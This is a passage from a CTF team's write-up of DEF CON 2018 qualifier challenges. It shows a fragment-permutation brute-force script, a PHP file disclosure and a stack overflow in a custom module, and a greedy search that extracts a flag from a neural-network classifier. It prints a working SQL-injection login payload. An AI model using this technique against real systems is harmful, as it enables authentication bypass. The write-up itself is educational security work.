</span></span><span class=line><span class=cl>    <span class=n>mode</span> <span class=o>|=</span> <span class=p>(</span><span class=n>mode</span> <span class=o>&amp;</span> <span class=mo>0o444</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span>    <span class=c1># copy R bits to X</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chmod</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>mode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fragments</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./fragment_&#39;</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;.dat&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>fragments</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>fragments</span> <span class=o>=</span> <span class=nb>reversed</span><span class=p>(</span><span class=n>fragments</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>permutations</span><span class=p>(</span><span class=n>fragments</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;broken&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>bytes</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;try&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>t</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x8d4</span><span class=o>-</span><span class=mh>0x5ad</span><span class=p>),</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>p</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>make_executable</span><span class=p>(</span><span class=s1>&#39;try&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;./try&#34;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=p>,</span> <span class=n>err</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>):</span> <span class=nb>print</span> <span class=n>out</span>
</span></span></code></pre></div><p>This quickly prints out the flag.</p><h2 class="relative group">Exzendtential-crisis<div id=exzendtential-crisis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exzendtential-crisis aria-label=Anchor>#</a></span></h2><p>We are given a <a href=http://d4a386ad.quals2018.oooverflow.io/ target=_blank>site</a> with two forms in the homepage: one to register an account, and one to login to an account. There is also a &ldquo;debug me&rdquo; link that shows the source code of the page.</p><p>Once we register an account, we can write an essay on the page <code>essays.php</code>. This page lists all the essays that the user wrote, and provides a preview. Appending <code>?source</code> to the url shows the page source (as in index.php). There is an obvious file disclosure:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;preview&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nv>$dirname</span> <span class=o>=</span> <span class=s2>&#34;upload/</span><span class=si>${</span><span class=nv>_SESSION[&#39;userid&#39;]</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nv>$fname</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>(</span><span class=nx>check_fname</span><span class=p>(</span><span class=nv>$fname</span><span class=p>)</span> <span class=o>===</span> <span class=k>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /essays.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>   <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=nv>$content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$dirname</span> <span class=o>.</span> <span class=nv>$fname</span><span class=p>,</span> <span class=k>False</span><span class=p>,</span> <span class=k>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>524288</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;&lt;h1&gt;Your essay submission&lt;/h1&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;&lt;a href=&#39;essays.php&#39;&gt;back&lt;/a&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>There is also a <code>flag.php</code> file, that only says:</p><pre tabindex=0><code>Only sarte knows the flag. You are not him. Enjoy a quote though:
One love, a career, a revolution, as many companies as we begin ignoring their outcome
</code></pre><p>Retrieving <code>php.ini</code> with the file disclousure shows that there is a custom module in the PHP installation, called <code>mydb.so</code>. With the file disclousure we downloaded the module, and then we started reversing it.</p><p>After reversing the module, we find that it exports 3 functions to PHP: <code>create_user</code>, <code>get_result</code> (both used in <code>register.php</code>), and <code>check_credentials</code> (used in <code>login.php</code>).
Internally, the module uses SQLite for storing user credentials, without validating the input (this is done on the PHP-side).
After looking a bit, we found an out-of-bounds write vulnerability that we can use to inject arbitrary SQL into a query.
In <code>check_credentials</code>, the module first retrieves the function arguments, and then calls <code>get_user_id</code> in order to verify the username/password. It passes to it a callback function, <code>check_hacking_attempt</code>, that takes two buffers, one containing the username, and one to copy the username to. It does some security checks before sending a query to SQLite. <code>check_hacking_attempt</code> copies the username string to the destination buffer, as long as its length is less than 150 characters. However, the destination buffer resides in the stack frame of <code>get_user_id</code>, which only allocated 112 bytes for it. Therefore, there is a 38 byte overflow.</p><p>In <code>get_user_id</code>, the destination buffer is located just before a table name buffer, which contains the name of the table used in the user selection query. By overwriting the table name, we can inject arbitrary SQL into the query. The injection that we choose is pretty trivial: <code>users where username="sarte" -- </code>.</p><p>The final payload is generated by the Python snippet <code>print('a' * 112 + 'users where username="sarte" -- ')</code>, that once inserted as username in the login, authenticates us as <code>sarte</code>. We can now retrieve the flag.</p><h2 class="relative group">Flagsifier<div id=flagsifier class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flagsifier aria-label=Anchor>#</a></span></h2><p>This challenge consisted in finding the correct input for a Deep Neural Network
that classifies images (size: <code>1064x28</code>) and has 40 output neurons.</p><p>There were some example images, composed of 38 letters from what looked like the EMNIST dataset.
All of them activated the fourth neuron, therefore being classified as the fourth class.</p><p>Some quick tests by moving around random letters and removing some others (plus, the structure
of the network) hinted us that there was a softmax and the classes were represented as one-hot
encoding. Therefore, the network classifies images into 40 classes. Time to discover what they are!</p><p>So, at first we transcribed the sample images and used the combination
of tile + corresponding text as dataset.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>dataname</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;HAMIETSENSITIZINGNARRATIVERECAPTURINGU&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;ELECTROENCEPHALOGRAMSPALATECONDOIESPEN&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;KINGFISHERCOMMONERSUERIFIESHORNETAUSTI&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;LIQUORHEMSTITCHESRESPITEACORNSGOALREDI&#34;</span><span class=p>]</span>
</span></span></code></pre></div><p>(Finding typos in this transcription is left as an exercise to the reader
&#x1f604; )</p><p>After that we divided all the sample images in 38 28x28-tiles (one tile per
letter).
We have done that using this script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>dataset</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>datalet</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>datax</span><span class=o>=</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./sample_</span><span class=si>%d</span><span class=s1>.png&#39;</span><span class=o>%</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>38</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=o>=</span><span class=n>img</span><span class=o>.</span><span class=n>crop</span><span class=p>((</span><span class=n>j</span><span class=o>*</span><span class=mi>28</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>j</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>28</span><span class=p>,</span><span class=mi>28</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>dataset</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>datalet</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>dataname</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>let</span><span class=o>=</span><span class=n>dataname</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>let</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>datax</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>datax</span><span class=p>[</span><span class=n>let</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>datax</span><span class=p>[</span><span class=n>let</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>dataset</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><ul><li><code>dataset</code> contains the images.</li><li><code>datalet[i]</code> contains the corresponding text of <code>dataset[i]</code>.</li><li><code>datax</code> contains the mapping between letters and array of samples. Basically
it answers to questions like: &ldquo;which dataset entries correspond to a particular
letter?&rdquo;</li></ul><p>Then, we experimented as follows: for each letter, starting from a black image,
put the letter in position 0&mldr;38, and classify these images. We saved all the
predictions, and then averaged them to see the most likely class for each letter.</p><p>We discovered that neurons 14&mldr;40 clasified letters: neuron 14 activated for A,
neuron 15 for B, up to neuron 40 for Z.</p><p>We then need to discover what the neurons 1&mldr;14 classify, as some of them probably
classify the flag.
To do that, we need to try to find inputs that maximize the activation of these, one at
a time. Another thing that we can leverage is that the flag likely starts by <code>OOO</code>.</p><p>So, what would one usually do here, with a &ldquo;real&rdquo; network? Decide which neuron (e.g.,
the first) to try to activate, then create random 38-letters inputs, and then use the
log-likelihood of that neuron for that input as the fitness function for his favourite
optimization algorithm (e.g., this problem looked perfect for genetic algorithms).</p><p>But before throwing cannons to the problem, let&rsquo;s try something simpler (and if it fails,
move to more advanced but computationally intensive stuff).
The suspect here is that the network is trained on a small dataset, and is strongly
overfitting the flag on some of the &ldquo;low&rdquo; neurons. This could maybe mean that
the function we need to optimize is not crazily non-linear and with tons of local optima
that require complex optimization algorithms to escape from. Therefore we tried with
a simple greedy strategy: for each of the 38 positions, pick the letter that maximizes the
output of the target neuron. And it worked!</p><p>Trying <code>OOO</code> as a test string showed activation of neurons 2 and 3 - let&rsquo;s focus on them.</p><h3 class="relative group">Results<div id=results class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#results aria-label=Anchor>#</a></span></h3><p>Neuron 2 has been our first guess, which gave us these (highly noisy) strings,
with the greedy strategy:</p><pre tabindex=0><code>OOOOTHISISBYKCOZMEKKAGETONASTEYOUATIMW
OOOOTHISISBYKCOZMKYKAGZTONBSTWVOUATIWM
OOOOTNISISBDKCOZMKSGBGETONMSTXVOUWTIRR
OOOOTOISISOYECOIUEYSOGETONOSTNVOUOTIWW
</code></pre><p>We tried (failing) to submit some flags like</p><ul><li><code>OOOOTHISISBYKCOZMESSAGETOHASTEYOLATINE</code></li><li><code>OOOOTHISISBYKCOZMESSAGETOHASTEYOLATINW</code></li><li>&mldr;</li></ul><p>After realizing that neuron 2 was just a test-neuron, we changed output neuron
from 2nd to 3rd and we got sentences like:</p><pre tabindex=0><code>OGOSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG
OOOSOMRAUTHGNTICINTGIIIGGNGGISMRGUIWEG
OOOSOMXAUTHENTICINTEKXIGXNCRISRRRRIRER
OOOSOYEOLTUTNTICINTEIIIGCNCEIIETOLIRTI
RROSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG
</code></pre><p>We obtained <code>OOOSOMEAUTHENTICINTELLIGENCEIS........</code> by averaging (and manually
correcting) them and after few tries of guessing ( :bowtie: ) the last word we
obtained the correct flag: <code>OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED</code>.</p><h3 class="relative group">Python script<div id=python-script class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#python-script aria-label=Anchor>#</a></span></h3><p>You can find here the full python script we have used (keras + tensorflow-gpu):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>keras.models</span> <span class=kn>import</span> <span class=n>load_model</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>keras.preprocessing</span> <span class=kn>import</span> <span class=n>image</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>keras.datasets</span> <span class=kn>import</span> <span class=n>mnist</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>keras.applications.resnet50</span> <span class=kn>import</span> <span class=n>preprocess_input</span><span class=p>,</span> <span class=n>decode_predictions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span><span class=p>,</span> <span class=n>ImageDraw</span><span class=p>,</span> <span class=n>ImageFont</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span><span class=o>,</span> <span class=nn>random</span><span class=o>,</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dataset</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>datalet</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>datax</span><span class=o>=</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=n>dataname</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;HAMIETSENSITIZINGNARRATIVERECAPTURINGU&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;ELECTROENCEPHALOGRAMSPALATECONDOIESPEN&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;KINGFISHERCOMMONERSUERIFIESHORNETAUSTI&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;LIQUORHEMSTITCHESRESPITEACORNSGOALREDI&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./sample_</span><span class=si>%d</span><span class=s1>.png&#39;</span><span class=o>%</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>38</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=o>=</span><span class=n>img</span><span class=o>.</span><span class=n>crop</span><span class=p>((</span><span class=n>j</span><span class=o>*</span><span class=mi>28</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>j</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>28</span><span class=p>,</span><span class=mi>28</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>dataset</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>datalet</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>dataname</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>let</span><span class=o>=</span><span class=n>dataname</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>let</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>datax</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>datax</span><span class=p>[</span><span class=n>let</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>datax</span><span class=p>[</span><span class=n>let</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>dataset</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>genImg</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=p>(</span><span class=mi>1064</span><span class=p>,</span><span class=mi>28</span><span class=p>),</span> <span class=n>color</span><span class=o>=</span><span class=s1>&#39;black&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#for i in range(max(0,len(n)-1),len(n)): # only this letter and everything else black</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>n</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span><span class=o>.</span><span class=n>paste</span><span class=p>(</span><span class=n>dataset</span><span class=p>[</span><span class=n>n</span><span class=p>[</span><span class=n>i</span><span class=p>]],</span> <span class=p>(</span><span class=n>i</span><span class=o>*</span><span class=mi>28</span><span class=p>,</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>img</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>load_model</span><span class=p>(</span><span class=s1>&#39;model.h5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=n>loss</span><span class=o>=</span><span class=s1>&#39;binary_crossentropy&#39;</span><span class=p>,</span> <span class=n>optimizer</span><span class=o>=</span><span class=s1>&#39;rmsprop&#39;</span><span class=p>,</span> <span class=n>metrics</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;accuracy&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>eeval2</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>op</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>genImg</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>img_to_array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>expand_dims</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>axis</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>classes</span> <span class=o>=</span> <span class=n>model</span><span class=o>.</span><span class=n>predict</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>score</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>classes</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>op</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>score</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>oo</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>40</span><span class=p>):</span> <span class=c1># start from 2, this one seems correct</span>
</span></span><span class=line><span class=cl><span class=c1>#   out=[datax[x][0] for x in &#39;OOOSOMEAUTHENTICINTELLIGENCEIS&#39;] #do not start from zero</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>),</span><span class=mi>38</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>maxv</span><span class=o>=</span><span class=p>([],</span> <span class=o>-</span><span class=mi>99999</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>datax</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>datax</span><span class=p>[</span><span class=n>j</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>score</span> <span class=o>=</span> <span class=n>eeval2</span><span class=p>(</span><span class=n>out</span><span class=p>,</span> <span class=n>oo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>score</span> <span class=o>&gt;</span> <span class=n>maxv</span><span class=p>[</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=n>maxv</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>score</span><span class=p>,</span> <span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=n>pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>%d</span><span class=s2>] </span><span class=si>%38s</span><span class=s2> : </span><span class=si>%.10lf</span><span class=s2>      </span><span class=se>\r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>oo</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>datalet</span><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>out</span><span class=p>]),</span> <span class=n>maxv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
